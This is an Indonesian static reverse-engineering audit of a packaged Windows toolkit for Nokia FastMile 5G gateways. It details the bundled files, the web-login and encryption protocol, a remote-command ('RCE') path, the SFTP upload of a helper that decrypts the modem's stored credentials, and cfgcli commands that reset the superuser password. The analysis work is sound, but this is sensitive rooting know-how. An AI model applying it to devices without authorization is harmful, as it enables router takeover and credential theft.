# DBAI-NOKIA Windows Toolkit — Dokumentasi Reverse Engineering, Audit & Spesifikasi Rekonstruksi

**Target Utama:** `target/dbai-nokia-win64.exe` (rilis v1.1, `github.com/armarchindo/nokia-gateway-2`)  
**SHA-256 Target:** `ee4a353f4a1df881cbbc4472c48bcf4ddb2363a84ee706afb214a79d948569da`  
**Ukuran Target:** `46.329.344` byte (`0x2c2f200` byte)  
**Payload Aplikasi Utama (KAX #0):** `dbai_nokia.dll` (diekspos pada header PE internal sebagai `_nuitka_temp.dll`), offset `0x10c29`–`0x129c229` (`19.445.248` byte, SHA-256 `382da1f3a1292c78...`); berkas hasil *carving* di `evidence/carved/_nuitka_temp.dll` berukuran `19.445.282` byte (SHA-256 `8320cf4b61d6c409b55e35c54ce12941034a697f010e18b89038ea13c8f44235`, mencakup 34 byte *header* entri berikutnya)  
**Tanggal Analisis & Audit:** 2026-11-07  
**Metode:** Analisis statis menyeluruh menggunakan REA 6.8.0, Ghidra 12.1.4, `objdump` (disassembly `pei-x86-64`), dekoder tabel arsip Nuitka `KAX`, dekoder blob konstanta Nuitka `__constants.bin` (`0x18098b820`), serta inspeksi simbol/rodata ELF64 AArch64 (`bin\test_decrypt_node`). Biner target tidak pernah dieksekusi dan tidak ada panggilan jaringan yang dilakukan.

---

## 0. Ringkasan Eksekutif & Daftar Koreksi Audit (Revisi v2)

Audit mendalam terhadap artefak biner dan revisi sebelumnya menemukan **9 kesalahan teknis krusial (*load-bearing issues*)** yang kini telah diperbaiki sepenuhnya di dalam dokumen ini:

1. **Koreksi Struktur Arsip Onefile Nuitka (`KAX`) & 9 Berkas Non-PE yang Terlewat (T-01):**
   Fungsi *bootloader* `FUN_140003720` (`0x140003720`) membaca arsip Nuitka bermagic `"KAX"` pada VA `0x140012000` (offset berkas `0x10c00`) yang memuat **36 berkas tertanam** (27 berkas PE Windows + **9 berkas Linux/modem di direktori `bin\`**). Pemindaian terdahulu hanya mencari *header* `MZ` sehingga melewatkan 1,33 MB payload di `0x210f439`–`0x2254608` yang berisi `bin\busybox` (ELF32 ARM), `bin\test_decrypt_node` (ELF64 AArch64), dan 7 skrip shell firmware Nokia (`bin\*.sh`). Selain itu, `evidence/carved/_nuitka_temp.dll` kelebihan 34 byte di bagian akhir karena memotong hingga *header* `MZ` milik `_asyncio.pyd` (`0x129c24b`), bukan batas ukuran `KAX` (`0x129c229`).
2. **Koreksi Mekanisme `test_decrypt_node` & `/configs/config_encryption.cfg` (T-02):**
   Revisi terdahulu mengira `/configs/test_decrypt_node` adalah *helper* bawaan firmware modem dan menandai protokol serta format keluarannya sebagai `UNK`. Faktanya, `bin\test_decrypt_node` (`131.593` byte, ELF64 AArch64) **dibundel di dalam `.exe` Windows** (entri KAX #32) dan diunggah otomatis via SFTP (`sftp.put`) ke `/tmp/test_decrypt_node` oleh `DbaiNokiaApp.extract_live_credentials` (`0x1800930f0`). Inspeksi biner ELF tersebut (`test_decrypt_node.c`) membuktikan bahwa ia **tidak membaca `/configs/config_encryption.cfg`**, melainkan memanggil `dlopen("/usr/lib/libcfgdb.so")` dan `dlsym("cfg_db_decryptNodeValue")` terhadap **5 *ciphertext* yang di-*hardcode* di dalam `test_decrypt_node.c`**.
3. **Koreksi Algoritma & Urutan Protokol `FastMileRCE.login` (T-03):**
   Revisi terdahulu tertipu oleh *docstring* penulis (`"using PBKDF2/SHA256"`) dan menyusun urutan protokol secara terbalik. Disassembly `FastMileRCE.login` (`0x18001f160`–`0x180023190`) membuktikan bahwa fungsi ini **sama sekali tidak menggunakan PBKDF2**, melainkan:
   - Mengambil `nonce`, `randomKey`, `iterations`, `pubkey` dari `GET /login_web_app.cgi?nonce`.
   - Jika `iterations >= 2`, mengirim `POST /login_web_app.cgi?salt` dengan body `userhash=<_su(user, nonce)>&nonce=<_urlesc(nonce)>` untuk memperoleh `alati` (salt).
   - Menghitung **iterated SHA-256** sebanyak `iterations` putaran atas `alati + pwd` (menggunakan `bytes.fromhex(K)` pada putaran ke-2 hingga ke-`it`), lalu mengirim `userhash`, `RandomKeyhash`, `response`, `nonce`, `enckey`, dan `enciv` ke `POST /login_web_app.cgi`.
4. **Koreksi Fungsi Bantu `_hp`, `_su`, dan `_urlesc` (T-03 Lanjutan):**
   Ketiga metode yang sebelumnya ditandai `UNK` atau salah diartikan telah dipulihkan secara eksak:
   - `_urlesc(s)` (`0x18001d2f0`): substitusi Base64 khusus Nokia `s.replace('+', '-').replace('/', '_').replace('=', '.')` (bukan `urllib.parse.quote`).
   - `_hp(cls, x, y)` (`0x18001d7e0`): `cls._b64(hashlib.sha256(f"{x}:{y}".encode()).digest())`.
   - `_su(cls, x, y)` (`0x18001e040`): `cls._urlesc(cls._hp(x, y))` (bukan pembungkus *superuser/shell* RCE).
5. **Koreksi Spesifikasi Enkripsi `FastMileRCE._enc_post` (T-04):**
   Disassembly `0x180023190` membuktikan penggunaan **AES-128-CBC** (`os.urandom(16)` untuk `key` dan `iv`) dengan *padding* PKCS#7 manual. Payload yang dienkripsi dengan RSA-PKCS1v15 (`ck`) **bukan** byte `key` mentah, melainkan string ASCII `f"{b64encode(key)} {b64encode(iv)}"` (dipisahkan spasi `' '`), yang kemudian di-*encode* dengan substitusi `.replace('+', '-').replace('/', '_').replace('=', '.')`.
6. **Koreksi Nama Parameter CSRF `&csrf_token=` (T-05):**
   String `&ucsrf_token=` pada spesifikasi lama adalah artefak pembacaan mentah `strings_win.txt` yang menggabungkan `mod_consts[254]` (`w&`) dan byte tag tipe Unicode Nuitka `'u'` pada `mod_consts[255]` (`ucsrf_token=\x00`). Nama parameter yang dikirim di jaringan adalah **`csrf_token=`**.
7. **Koreksi Hashing SHA-256 Huruf Besar pada Menu `[s]` (`menu_change_superuser_pwd`, T-06):**
   Modem tidak menerima *plaintext* pada `WebAccount.Password`. Metode `menu_change_superuser_pwd` (`0x18008fcc0`) menghitung `hashlib.sha256(new_pwd.encode()).hexdigest().upper()` sebelum memanggil `cfgcli -s ...WebAccount.Password <SHA256_UPPER> && cfgcli --save-db`.
8. **Koreksi Bukti Jalur Unroot Web API (`[r]`) & Pemanggilan `cfgcli` di Menu OTA (`[m]`, T-07):**
   Jalur *fallback* unroot via Web Management API (`FastMileRCE.execute_rce` + `reboot_modem`) terbukti lengkap di `menu_revoke_root` (`0x180089440`, `mod_consts[1193..1197]`). Selain itu, `menu_trigger_ota` (`0x18009ee70`, `mod_consts[1337]`) juga memanggil `cfgcli -s InternetGatewayDevice.X_ALU-COM_Wifi.X_ALU-COM_SwMgnt.X_ALU-COM_Enable true && cfgcli --save-db`.
9. **Pemulihan Lengkap 1.583 Konstanta, 11 Kelas, dan 75 Alamat Fungsi Native C (T-08 & T-09):**
   Seluruh 1.583 entri `mod_consts[0..1582]` (`VA 0x18126e2d8`–`0x181271448`) dan seluruh 75 *entry point* fungsi C di `.text` (`0x18000fb50`–`0x1800a3e20`) telah dipetakan secara lengkap beserta nomor baris sumber `dbai_nokia.py`. Penyebab duplikasi konstanta di `.rdata` dipastikan berasal dari kompilasi ganda Nuitka Windows untuk modul `.__main__` (`0x11194b6`) dan `.__parents_main__` (`0x1128588`, dukungan *spawn* `multiprocessing`).

---

## 1. Indeks Bukti (Evidence Index)

Seluruh artefak bukti statis disimpan di bawah `evidence/` dan `snapshot*.json`:

| # | Deskripsi Bukti | ID Bukti REA / Lokasi Berkas |
|---|---|---|
| 1 | Tabel impor PE biner luar (11 DLL, 93 fungsi) | `ev_383aca5ba8650d44460ed537a3b19327111ec2af65e02fc728b7b84c0c649f16` · `evidence/pe_imports.json` |
| 2 | Resource PE biner luar (1 `RT_MANIFEST`, 1.265 B) | `ev_79014e4049f49022d5f29cc4aefaba4f56eec23b2947bc07563d9abcf9008e43` · `evidence/pe_resources.json` |
| 3 | Entropi byte biner luar (entropi berkas 6,3829; rata-rata blok 5,32) | `ev_00b511dd7ec52e16b890232af61fd5be499af767b26dafac078e710799f87ea0` · `evidence/byte_entropy.json` |
| 4 | Ekspor native biner luar (0 ekspor) | `ev_2b0d2752d1ee21dc770883565e4e9e5cb7a09c55db0cfdcf510dfa522bd94abe` · `evidence/native_exports.json` |
| 5 | Ringkasan Ghidra biner luar (219 prosedur, 100.163 string) | `ev_c20e0ecd1905eb22369aaced81e9181a82d5b94bc4036f48fc5e1d768175fa10` · `evidence/inspect_overview.json`, `snapshot.json` |
| 6 | Pencarian string Ghidra `impl_dbai_nokia` (0 hasil) | `ev_ba78a92a229f0aa54110cc0a5402f27597242c62bf38db584b3c274143696583` · `evidence/search_impl_dbai.json` |
| 7 | Pencarian string Ghidra `menu_extract_factory_mim` (6 hasil) | `ev_f5b8c92f1a400cf8b405e06300c0973110af6cc63b4d681180f93796976c7016` · `evidence/search_menu_extract.json` |
| 8 | Dekompilasi penuh `.text` biner luar (127/127 fungsi ditulis) | `ev_2daef532264bf4b5e04dd7038744827510e48c9675a97c391ed8ecb7fe87730b` · `evidence/decompile_all.json`, `evidence/decompiled/` |
| 9 | Tabel impor PE `_nuitka_temp.dll` (11 DLL, 356 fungsi) | `ev_f3211b4ca5d923b94aefb69d3f293012127e9794ccd582c4a49c7356929e53bb` · `evidence/carved/nuitka_pe_imports.json` |
| 10 | Ringkasan Ghidra `_nuitka_temp.dll` (10.843 prosedur, 42.835 string) | `ev_2ca53a6556971d38fde22df1fbc976cc41bfb26591a7da9966e86235a5146ae2` · `evidence/carved/nuitka_inspect_overview.json`, `snapshot_nuitka.json` |
| 11 | Inventaris string mentah (320.591 baris) + peta offset berkas | `evidence/strings_win.txt`, `evidence/strings_win_offset.txt` |
| 12 | Indeks pemindaian header PE tertanam (28 header PE) | `evidence/carved/embedded_pe_index.json` |
| 13 | Berkas hasil *carving* payload utama `_nuitka_temp.dll` (`dbai_nokia.dll`) | `evidence/carved/_nuitka_temp.dll` |
| 14 | Sampel VA ruang DLL untuk 11 konstanta string aplikasi | `evidence/carved/nuitka_app_string_vas.json` |

---

## 2. Arsitektur Biner & Struktur Arsip Onefile Nuitka (`KAX`)

### 2.1 Arsitektur Sebenarnya: Bundel Nuitka Onefile + CPython 3.13.14 (OBS, Tinggi)

Klaim pemasaran pada README asli bahwa perangkat lunak ini *"compiled to native C machine code"* dan *"zero-dependency"* **tidak akurat secara arsitektural** (lihat §10, V-01):

- **Biner Luar (`target/dbai-nokia-win64.exe`):** Merupakan *bootloader* **Nuitka Onefile** (PE32+, `amd64`, *image base* `0x140000000`). Seksi kode `.text` (`0x140001000`–`0x140011800`) hanya berukuran `67.584` byte (219 prosedur Ghidra; 127 prosedur memiliki *body* yang didekompilasi seluruhnya di `evidence/decompiled/functions/`). Hampir seluruh isi berkas berada di seksi `.rdata` (`0x140012000`–`0x142c2f200`, ukuran `46.256.640` byte, offset berkas `0x10c00`–`0x2c2de00`).
- **Mekanisme Ekstraksi Bootloader (`FUN_140003720` di `evidence/decompiled/functions/0x140003720.c`):**
  1. Memeriksa variabel lingkungan `NUITKA_ONEFILE_PARENT` (`0x140003779`) dan mengatur `SetDllDirectoryW(L"")`.
  2. Membentuk direktori ekstraksi sementara dengan pola `{TEMP}\onefile_{PID}_{TIME_US}_{RANDOM}` melalui `FUN_140002440` (`0x1400038fb`) dan mendaftarkan *handler* `SetConsoleCtrlHandler(FUN_1400035c0, 1)` untuk membersihkan direktori sementara saat proses berakhir.
  3. Membaca *header* arsip Nuitka tak terkompresi di awal `.rdata` (`DAT_140012000`, offset berkas `0x10c00`). Tiga byte pertama adalah *magic* `"KAX"` (`0x4b 0x41 0x58` — menandakan *uncompressed payload* pada Nuitka, berbeda dari `"KAY"` yang terkompresi Zstandard).
  4. Melakukan iterasi pembacaan entri berturut-turut hingga menemukan string nama berkas kosong (`0x0000`):
     - Nama berkas relatif dalam format `wchar_t[]` (UTF-16LE berakhiran NUL `0x0000`).
     - Ukuran berkas `uint64_t` (8 byte *little-endian*).
     - Byte isi berkas sepanjang `size` byte, yang ditulis ke disk dalam blok `0x8000` (32 KiB) menggunakan `CreateFileW` dan `WriteFile`.
  5. Berkas pertama yang diekstrak (`DAT_142c3c090`, yaitu `dbai_nokia.dll`) kemudian dimuat ke memori dengan `AddDllDirectory` + `LoadLibraryExW(..., 0xd00)`, lalu *bootloader* memanggil fungsi ekspor `GetProcAddress(hModule, "run_code")` (`0x140003e21`).

### 2.2 Inventaris Lengkap 36 Berkas dalam Arsip `KAX` (`0x10c00`–`0x2c27c34`) (OBS, Tinggi)

Tabel berikut adalah daftar **seluruh 36 berkas** yang diekstrak oleh *bootloader* dari arsip `KAX` (mengoreksi `evidence/carved/embedded_pe_index.json` yang hanya mendeteksi 27 PE tertanam dan melewatkan 9 berkas di direktori `bin\`):

| # | Path Relatif (`UTF-16LE`) | Offset Data | Ukuran (Byte) | Format / Arsitektur | SHA-256 (16 Heks Awal) | Peran Fungsional |
|---|---|---|---|---|---|---|
| 0 | `dbai_nokia.dll` | `0x0010c29` | 19.445.248 | PE32+ DLL (`amd64`) | `382da1f3a1292c78` | Aplikasi utama (`dbai_nokia.py` + modul Python terkompilasi Nuitka) |
| 1 | `_asyncio.pyd` | `0x129c24b` | 72.928 | PE32+ PYD (`amd64`) | `2d13fa4b5ef94464` | Ekstensi CPython 3.13 `asyncio` |
| 2 | `_bz2.pyd` | `0x12adf45` | 86.752 | PE32+ PYD (`amd64`) | `76a33e2baa3880aa` | Ekstensi kompresi `bz2` |
| 3 | `_cffi_backend.pyd` | `0x12c3251` | 180.736 | PE32+ PYD (`amd64`) | `21b7160d4a6da959` | Backend CFFI (`_cffi_backend.cp313-win_amd64.pyd`) |
| 4 | `_ctypes.pyd` | `0x12ef471` | 134.368 | PE32+ PYD (`amd64`) | `75687620596877b0` | Ekstensi FFI `ctypes` |
| 5 | `_decimal.pyd` | `0x1310173` | 286.432 | PE32+ PYD (`amd64`) | `906964c01d04b360` | Ekstensi aritmetika `decimal` |
| 6 | `_hashlib.pyd` | `0x1356075` | 69.344 | PE32+ PYD (`amd64`) | `5eb4a2aa9e28b49c` | Wrapper OpenSSL untuk `hashlib` |
| 7 | `_lzma.pyd` | `0x1366f71` | 159.456 | PE32+ PYD (`amd64`) | `f221ed5f1c2789aa` | Ekstensi kompresi `lzma` |
| 8 | `_multiprocessing.pyd` | `0x138de83` | 38.112 | PE32+ PYD (`amd64`) | `c04d2822d62f675d` | Dukungan `multiprocessing` Windows |
| 9 | `_overlapped.pyd` | `0x139738b` | 57.568 | PE32+ PYD (`amd64`) | `579438a55311bf39` | I/O asinkron Windows IOCP |
| 10 | `_queue.pyd` | `0x13a5489` | 35.552 | PE32+ PYD (`amd64`) | `6d77d15d668cb5dd` | Struktur antrean *thread-safe* |
| 11 | `_socket.pyd` | `0x13adf89` | 86.752 | PE32+ PYD (`amd64`) | `ba944001aa6b5335` | Soket jaringan tingkat rendah (`socket`) |
| 12 | `_ssl.pyd` | `0x13c3283` | 181.984 | PE32+ PYD (`amd64`) | `1cf939510359f5aa` | TLS/SSL wrapper (`ssl`) |
| 13 | `_wmi.pyd` | `0x13ef97d` | 39.648 | PE32+ PYD (`amd64`) | `ca38a50c27413a5a` | Kuery WMI Windows (`platform`) |
| 14 | `libcrypto-3.dll` | `0x13f9485` | 5.238.520 | PE32+ DLL (`amd64`) | `09499e186cf0e434` | Pustaka kriptografi OpenSSL 3.x |
| 15 | `libffi-8.dll` | `0x18f839f` | 39.696 | PE32+ DLL (`amd64`) | `eff52743773eb550` | Foreign Function Interface |
| 16 | `libssl-3.dll` | `0x1901ed1` | 794.872 | PE32+ DLL (`amd64`) | `28c395290279fa4f` | Pustaka protokol TLS OpenSSL 3.x |
| 17 | `pyexpat.pyd` | `0x19c3fe9` | 221.920 | PE32+ PYD (`amd64`) | `1037b8bfb0cd3131` | Parser XML Expat |
| 18 | `python3.dll` | `0x19fa2e9` | 72.416 | PE32+ DLL (`amd64`) | `16f109e8411bc083` | Forwarder ABI stabil Python 3 |
| 19 | `python313.dll` | `0x1a0bded` | 6.132.448 | PE32+ DLL (`amd64`) | `3a7a6170ea840bf2` | Runtime inti **CPython 3.13.14** |
| 20 | `select.pyd` | `0x1fe50eb` | 32.992 | PE32+ PYD (`amd64`) | `a208997eb871b5c7` | Multiplexing I/O `select` |
| 21 | `unicodedata.pyd` | `0x1fed1f3` | 712.928 | PE32+ PYD (`amd64`) | `7f8d28574732959c` | Basis data karakter Unicode |
| 22 | `vcruntime140.dll` | `0x209b2fd` | 120.400 | PE32+ DLL (`amd64`) | `052ad6a20d375957` | Runtime C/C++ MSVC |
| 23 | `vcruntime140_1.dll` | `0x20b897b` | 49.776 | PE32+ DLL (`amd64`) | `6a99bc0128e0c7d6` | Penanganan eksepsi C++64 MSVC |
| 24 | `bcrypt\_bcrypt.pyd` | `0x20c4c19` | 305.152 | PE32+ PYD (`amd64`) | `898d1fe05e287d66` | Ekstensi Rust `bcrypt` (`bcrypt_rust.dll`, untuk `paramiko`) |
| 25 | `bin\busybox` | `0x210f439` | 1.148.524 | **ELF32 ARM (`0x28`)** | `141adb1b625a6f44` | **Biner BusyBox ARM 32-bit statis** yang disajikan ke modem via HTTP port 8081 |
| 26 | `bin\partswitch_init.sh` | `0x2227adb` | 4.871 | Skrip Bash (`#!/bin/bash`) | `6eb3b0082b90501c` | Skrip firmware Nokia (tidak direferensikan oleh aplikasi; terbawa dari folder `bin\`) |
| 27 | `bin\prepare.sh` | `0x2228e08` | 2.916 | Skrip Bash (`#!/bin/bash`) | `667135bc040eca1e` | Skrip firmware Nokia (tidak direferensikan oleh aplikasi) |
| 28 | `bin\pubwanstate.sh` | `0x222999a` | 33.131 | Skrip Bash (`#!/bin/bash`) | `8a0d8f2bb3484457` | Skrip MQTT WAN firmware Nokia (tidak direferensikan oleh aplikasi) |
| 29 | `bin\recover_sim.txt` | `0x2231b35` | 2.032 | Skrip Bash (`#!/bin/bash`) | `6b44a434521eecb0` | Skrip pemulihan SIM firmware Nokia (tidak direferensikan oleh aplikasi) |
| 30 | `bin\rollback.sh` | `0x223234d` | 1.775 | Skrip Bash (`#!/bin/bash`) | `4c90d9b3a4573d26` | Skrip *rollback* firmware Nokia (tidak direferensikan oleh aplikasi) |
| 31 | `bin\rollbackfw.sh` | `0x2232a68` | 4.726 | Skrip Bash (`#!/bin/bash`) | `ca164e7d51cc7fc0` | Skrip *rollbackfw* firmware Nokia (tidak direferensikan oleh aplikasi) |
| 32 | `bin\test_decrypt_node` | `0x2233d12` | 131.593 | **ELF64 AArch64 (`0xb7`)** | `cabc9dc68375a2c7` | **Helper dekripsi `libcfgdb.so` (`test_decrypt_node.c`)** yang diunggah via SFTP ke modem pada Menu `[i]` |
| 33 | `bin\update_ota_info.sh` | `0x2253f51` | 1.633 | Skrip Bash (`#!/bin/bash`) | `3f20e53cdc6f6203` | Skrip OTA firmware Nokia (tidak direferensikan oleh aplikasi) |
| 34 | `cryptography\hazmat\bindings\_rust.pyd` | `0x2254608` | 9.897.472 | PE32+ PYD (`amd64`) | `1d4332a447cab13d` | Backend Rust untuk paket Python `cryptography` (`cryptography_rust.dll`) |
| 35 | `nacl\_sodium.pyd` | `0x2bc4c32` | 405.504 | PE32+ PYD (`amd64`) | `57822e7aed944269` | Ekstensi PyNaCl `libsodium` (untuk `paramiko`) |

### 2.3 Tata Letak Runtime & Struktur Berkas Keluaran di PC (OBS, Tinggi)

Untuk rekonstruksi *clean-room*, perangkat lunak dapat ditulis langsung sebagai aplikasi Python 3.12/3.13 dengan dependensi:
- Pustaka pihak ketiga: `paramiko` (SSH & SFTP client; menggunakan `AutoAddPolicy`) dan `cryptography` (`AES`, `CBC`, `padding.PKCS1v15`, `rsa`, `serialization.load_pem_public_key`).
- Pustaka standar (`stdlib`): `urllib.request`, `urllib.parse`, `urllib.error`, `http.cookiejar`, `http.server`, `socket`, `hashlib`, `base64`, `json`, `re`, `shutil`, `subprocess`, `threading`, `time`, `os`, `sys`, `pathlib`.
- Aset biner pendamping untuk fitur *dump* dan dekripsi *live*: `bin/busybox` (ELF32 ARM statis) dan `bin/test_decrypt_node` (ELF64 AArch64).

Struktur berkas lengkap yang dihasilkan oleh program di komputer pengguna (`mod_consts[66, 47, 53, 519, 570, 571, 603, 674, 675, 491, 492, 757, 1284]`):

```text
./
├── config_toolkit.json                 # Konfigurasi tersimpan (modem_ip, web_pwd, ssh_pwd, backup_dir)
├── fastmile_key                        # Kunci privat RSA 2048-bit (PEM PKCS#1/TraditionalOpenSSL, chmod 0600 / icacls)
├── fastmile_key.pub                    # Kunci publik OpenSSH
└── image_backup/                       # Direktori output default (dapat diubah via Menu [k] opsi 6)
    ├── md5sums.txt                     # Manifest MD5 per partisi yang dikirim paling akhir dari modem via TCP 8888
    ├── report.txt                      # Laporan hasil verifikasi MD5 (MD5Validator.verify)
    ├── *.img                           # 50 citra partisi user-area (/dev/mmcblk0p1 .. p50, dinamai menurut PARTNAME)
    ├── user_data_dir.tar.gz            # Arsip opsional direktori /data (Menu [8] / DumperEngine.execute_tarball_ssh)
    ├── rom_etc_dir.tar.gz              # Arsip opsional direktori /rom/etc (Menu [8])
    ├── non-userarea/                   # Dibuat oleh DumperEngine.fetch_emmc_info & generate_dump_bash
    │   ├── mmcblk0boot0.bin            # Dump partisi boot0 (/dev/mmcblk0boot0)
    │   ├── mmcblk0boot1.bin            # Dump partisi boot1 (/dev/mmcblk0boot1)
    │   ├── ext_csd.bin / ext_csd.txt   # Register Extended CSD 512 byte (debugfs / mmc extcsd read)
    │   ├── CID.txt                     # Nilai mentah register Card Identification (128-bit)
    │   ├── CSD.txt                     # Nilai mentah register Card Specific Data (128-bit)
    │   └── info_eMMC.txt               # Laporan spesifikasi vendor, kapasitas, IC marking, dan kesehatan eMMC
    └── credentials/
        └── info_<SN>.txt               # Laporan identitas pabrik (Factory_MIM) & audit kredensial (Menu [i] / [a])
```

**Observasi Versi Tertinggal (*Stale Version Strings*, OBS):** Walaupun *banner* terminal pada versi Windows v1.1 telah menampilkan `V1.1`, terdapat **dua** string konstanta yang masih bertuliskan `(v1.0)`:
1. `mod_consts[749]` di `MD5Validator.verify`: `' Laporan Verifikasi MD5 Nokia FastMile 5G GW2 (v1.0)'`.
2. `mod_consts[1427]`: *docstring* tingkat modul (`__doc__`) pada baris pertama `dbai_nokia.py`: `'DBAI-NOKIA: Nokia FastMile 5G GW2 Unified Toolkit (v1.0)'`.

### 2.4 Detail Struktur PE Biner Luar & Payload `_nuitka_temp.dll` (OBS, Tinggi)

1. **PE Biner Luar (`target/dbai-nokia-win64.exe`, bukti #1–#5, #8):**
   - *Image Base*: `0x140000000`. Seksi: `Headers` (`0x140000000`–`0x140000400`), `.text` (`0x140001000`–`0x140011800`, 67.584 B), `.rdata` (`0x140012000`–`0x142c2f200`, 46.256.640 B), `.data` (`0x142c30000`–`0x142c5c980`, 182.656 B), `.pdata` (1.024 B), `.tls` (512 B), `.rsrc` (1.536 B), `.reloc` (512 B).
   - Impor PE: 11 DLL, 93 fungsi (`api-ms-win-crt-*`, `KERNEL32.dll` 48 fungsi, `SHELL32.dll` 3 fungsi). Tidak mengimpor fungsi jaringan (`WS2_32.dll` / `WinHTTP`).
   - Resource PE: 1 entri `RT_MANIFEST` (tipe 24, ID 1, bahasa 0, offset `46.327.384`, ukuran `1.265` B, SHA-256 `94b146eac0a80f5089ac9e57303515ddf9087d9d88fd4d47f27df8f3cf14cbb4`).
   - Entropi: 6,3829 (keseluruhan berkas); rata-rata blok 4 KiB adalah 5,32 (11.311 blok; 197 blok berentropi tinggi ≥7,2 mulai offset `19.066.880`). Tidak menggunakan *packer* atau enkripsi string.
2. **PE Payload Aplikasi (`dbai_nokia.dll` / `evidence/carved/_nuitka_temp.dll`, bukti #9–#10):**
   - *Image Base*: `0x180000000`.
   - Seksi PE:
     - `.text`: RVA `0x00001000` (`VA 0x180001000`–`0x1809a0000`), `VirtualSize = 0x99ef76` (`10.088.310` B), `RawOffset = 0x400`, `RawSize = 0x99f000` (`10.088.448` B).
     - `.rdata`: RVA `0x009a0000` (`VA 0x1809a0000`–`0x181255200`), `VirtualSize = 0x8b5058` (`9.130.072` B), `RawOffset = 0x99f400`, `RawSize = 0x8b5200` (`9.130.496` B).
     - `.data`: RVA `0x01256000` (`VA 0x181256000`–`0x1812a6da0`), `VirtualSize = 0x50da0` (`331.168` B), `RawOffset = 0x1254600`, `RawSize = 0x15400` (`87.040` B; sisanya adalah BSS tak terinisialisasi tempat tabel `mod_consts` runtime dialokasikan).
     - `.pdata`: RVA `0x012a7000`, `RawSize = 0x1f000` (`126.976` B).
     - `.tls`, `.rsrc`, `.reloc`.
   - Rumus konversi cepat Offset Berkas ↔ Virtual Address (VA) pada `_nuitka_temp.dll`:
     - Untuk `.text` dan `.rdata`: $\text{VA} = \text{Offset Berkas} + \text{0x180000c00}$.
     - Untuk `.data`: $\text{VA} = \text{Offset Berkas} - \text{0x1254600} + \text{0x181256000} = \text{Offset Berkas} + \text{0x180001a00}$.

---

## 3. Peta Lengkap Modul, Tabel Konstanta Nuitka, 11 Kelas, dan 75 Fungsi Native

### 3.1 Mekanisme Tabel Modul & Konstanta Nuitka di `_nuitka_temp.dll` (OBS, Tinggi)

1. **Tabel `meta_path_loader_entries` (`VA 0x181262aa0`, offset berkas `0x12610a0`):**
   - Entri utama untuk modul `"__main__"` (`VA 0x1812088bf`) menunjuk ke dua fungsi inisialisasi di `.text`:
     - `modulecode___main__` pada **`VA 0x180007230`** (fungsi eksekusi tingkat modul `dbai_nokia.py`).
     - `_createModuleConstants___main__` wrapper pada **`VA 0x18000caf0`**.
   - Entri berikutnya di `VA 0x181262bb0` adalah `"__parents_main__-preLoad"` (`0x1800a58d0`) dan `"__parents_main__"`. Karena modul `multiprocessing` diimpor pada Windows (yang menggunakan mekanisme *spawn*, bukan *fork*), Nuitka mengompilasi `dbai_nokia.py` **dua kali** ke dalam `_nuitka_temp.dll`: satu kali sebagai `.__main__` dan satu kali sebagai `.__parents_main__`. Inilah alasan pasti mengapa seluruh string konstanta aplikasi muncul dua kali di dalam biner (mengoreksi hipotesis lama di §3.3).
2. **Dekoder Blob Konstanta `__constants.bin` (`loadConstantsBlob` pada `VA 0x180972870` & `unpackValue` pada `VA 0x18098b820`):**
   - Saat `modulecode___main__` (`0x180007230`) dijalankan, instruksi pada `0x180007272`–`0x180007283` memanggil:
     `loadConstantsBlob(tstate, &mod_consts[0], ".__main__")`
     di mana `&mod_consts[0]` berada pada alamat BSS **`.data` `VA 0x18126e2d8`** hingga **`0x181271450`** (`12.664` byte = `1.583` pointer `PyObject *` berukuran 8 byte).
   - Di dalam `.rdata`, blob `.__main__\x00` dimulai pada offset berkas **`0x11194b6`** (`VA 0x18111a0b6`), diikuti header 6 byte `<IH`: `blob_size = 61.753` byte (`0xf139`) dan `const_count = 1.583` (`0x062f`).
   - Fungsi `unpackValue` (`0x18098b820`) menggunakan *jump table* di `VA 0x1812176f8` (offset `0x1216af8`) untuk mendekode setiap item berdasarkan 1 byte *tag* tipe Nuitka: `'a'` (ASCII identifier NUL-terminated), `'u'` (UTF-8 Unicode NUL-terminated), `'w'` (1 karakter ASCII), `'s'` (string kosong `""`), `'c'` (bytes NUL-terminated), `'d'` (1 byte), `'b'`/`'B'` (bytes/bytearray dengan panjang varint LEB128), `'l'`/`'q'` (integer positif/negatif LEB128), `'G'`/`'g'` (bigint), `'f'` (double IEEE-754 8 byte), `'T'`/`'L'`/`'P'`/`'S'` (tuple/list/set/frozenset rekursif), `'D'` (dict rekursif), `'C'`/`'K'`/`'W'`/`'Y'` (`PyCodeObject`), `'t'` (`True`), `'F'` (`False`), `'n'` (`None`), `'p'` (duplikasi elemen sebelumnya), `'E'`/`'O'` (atribut builtin/os).
   - Setiap slot konstanta ke-$i$ ($0 \le i < 1583$) berada tepat di alamat:
     $$\text{VA}(\text{mod\_consts}[i]) = \text{0x18126e2d8} + 8 \times i$$

### 3.2 Inventaris Lengkap 11 Kelas (`mod_consts[1450..1579]`) (OBS, Tinggi)

Revisi terdahulu menulis bahwa aplikasi mendefinisikan 4 kelas (dan hanya mendaftar 7). Berdasarkan inspeksi `modulecode___main__` (`0x180007230`) dan penanda `__qualname__` / `__firstlineno__` / `__static_attributes__` pada `mod_consts[1450..1579]`, kode sumber `dbai_nokia.py` mendefinisikan **11 kelas** dan **8 fungsi tingkat modul**:

1. **Fungsi Tingkat Modul (baris 79–116):** `strip_ansi`, `pad_ansi`, `init_terminal`, `clear_screen`, `log_info`, `log_success`, `log_warn`, `log_error`.
2. **`Colors` (baris 53, `mod_consts[1450..1465]`):** Menyimpan kode warna ANSI 24-bit RGB (`RESET`, `BOLD`, `DIM`, `WHITE`, `MAGENTA`, `CYAN`, `BLUE`, `GREEN`, `GRAY`, `YELLOW`, `RED`).
3. **`Config` (baris 123, `mod_consts[1469..1475]`, 5 metode):** `__init__`, `load_saved_config`, `save_config`, `_find_busybox`, `detect_pc_ip`. Atribut statis (`mod_consts[1475]`): `('modem_ip', 'web_user', 'web_pwd', 'ssh_user', 'ssh_pwd', 'ssh_ports', 'key_name', 'http_port', 'tcp_port', 'backup_dir', 'pc_ip', 'is_subnet_matched', 'is_web_authenticated', 'busybox_path')`.
4. **`SSHKeyManager` (baris 262, `mod_consts[1476..1479]`, 2 metode):** `fix_permissions`, `ensure_keys` (catatan: metode `generate_key` yang disebut di spesifikasi lama tidak ada; pembangkitan RSA 2048-bit dilakukan langsung di dalam `ensure_keys`).
